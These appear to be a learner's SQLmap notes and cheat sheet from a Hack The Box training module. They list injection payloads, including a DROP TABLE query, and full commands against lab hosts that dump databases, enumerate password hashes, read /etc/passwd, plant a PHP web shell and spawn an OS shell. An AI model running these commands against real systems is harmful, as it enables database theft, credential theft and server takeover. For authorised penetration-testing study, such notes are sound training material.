# [SQLmap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- Run it via taskbar or with 'sqlmap' or `python sqlmap.py` in terminal
- advanced help is `-hh`
- The technique characters BEUSTQ refers to the following:
    - B: Boolean-based blind - most common (`AND 1=1`)
    - E: Error-based (`AND GTID_SUBSET(@@version,0)`)
    - U: Union query-based (`UNION ALL SELECT 1,@@version,3`)
    - S: Stacked queries (`; DROP TABLE users`)
    - T: Time-based blind (`AND 1=IF(2>1,SLEEP(5),0)`)
    - Q: Inline queries (`SELECT (SELECT @@version) from`)

 - SQLMap Output descriptions - `https://academy.hackthebox.com/module/58/section/696`
 - Best way to properly set up an SQLMap request against a specific target is to sue 'Copy as cURL'. By pasting the clipboard content into the command line, and changing the original command curl to sqlmap, we are able to use SQLMap with the identical curl command - `sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'`
 - Flags for automatic paramter finding - `--crawl, --forms or -g`
 - GET requests usually include -u / --url but POST requests usually contai nthe --data flag - `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`
 - POST parameters `uid` and `name` will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter uid is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using -p uid. Otherwise, we could mark it inside the provided data with the usage of special marker * as follows - `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`
 - Can run SQLMap with a HTTP request file using the `-r` flag. Similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.
 - Specify the cookie with `--cookie` or `-H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`
 - To randomize the User-Agent header value use `--random-agent` or `--mobile` to imitate a phone
 - This dumps the out to a folder in root `sqlmap 'http://94.237.61.133:50543/case2.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://94.237.61.133:50543' -H 'Connection: keep-alive' -H 'Referer: http://94.237.61.133:50543/case2.php' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --data-raw 'id=1' --dump --batch`
- `--dump`              Dump DBMS database table entries
- `--dump-all`          Dump all DBMS databases tables entries
- `--users`             Enumerate DBMS users
- `--passwords`         Enumerate DBMS users password hashes
- `--tables`            Enumerate DBMS database tables

- For cookies injection, copy as cURL, append `--dump --batch --cokie:"id=1*` e.g `sqlmap 'http://94.237.61.133:50543/case3.php' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://94.237.61.133:50543/case3.php' -H 'Cookie: id=1' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --dump --batch --cookie="id=1*"` then go looking in output
- Similar story for JSON, copy as cURL and it kinda just does it for you `sqlmap 'http://94.237.61.133:50543/case4.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/json' -H 'Origin: http://94.237.61.133:50543' -H 'Connection: keep-alive' -H 'Referer: http://94.237.61.133:50543/case4.php' --data-raw '{"id":1}' --batch --dump`
- Run with `--parse-errors` to print DBMS errors to console for grater clarity on any potential issues
- You can use `--proxy` to send all data through burp for closer inspection and poking
- If you want to throw the kitchen sink `--level=5 --risk=3`
- Make risk = 3 for login attempts
- If you want to target a specific table `-T <tablename>`

- GET: `sqlmap -u "http://example.com/page.php?id=1"`
- POST: `sqlmap -u "http://example.com/page.php" --data="id=1"`
- Cookie: `sqlmap -u "http://example.com/page.php" --cookie="id=1*"`
- HTTP Headers: `sqlmap -u "http://example.com/page.php" --headers="X-Forwarded-For: 127.0.0.1*"`
- For JSON data: `sqlmap -u "http://example.com/api" --data '{"id":1}' --content-type="application/json"`

# Cheat Sheet

| **Command** | **Description** |
| ----------- | ----------- |
| `sqlmap -h` | View the basic help menu |
| `sqlmap -hh` | View the advanced help menu [Getting Started with SQLMap](https://academy.hackthebox.com/module/58/section/694) |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch` | Run `SQLMap` without asking for user input using the `batch` switch. |
| `sqlmap output logging information definitions` | [SQLMap Output Description](https://academy.hackthebox.com/module/58/section/696) |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'` | `SQLMap` with POST request |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt` | Passing an HTTP request file to `SQLMap` [To run SQLMap with an HTTP request file, we use the -r flag, as follows:](https://academy.hackthebox.com/module/58/section/517) |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | Specifying a cookie header |
| `sqlmap -u www.target.com --data='id=1' --method PUT` | Specifying a PUT request |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Store traffic to an output file [Handling SQLMap Errors](https://academy.hackthebox.com/module/58/section/695) |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` | Specify verbosity level |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` | Specifying a prefix or suffix [Attack Tuning](https://academy.hackthebox.com/module/58/section/526) |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5` | Specifying the level and risk |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | Basic DB enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` | Table enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | Table/row enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --schema` | Database schema enumeration |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user` | Searching for data |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | Password enumeration and cracking |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass [Anti-CSRF Token Bypass switch](https://academy.hackthebox.com/module/58/section/530) |
| `sqlmap --list-tampers` | List all tamper scripts |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | Check for DBA privileges |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | Reading a local file |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell` | Spawning an OS shell |

- https://www.zwarts-sec.com/posts/Hack-The-Box-SQLMap-Essentials/
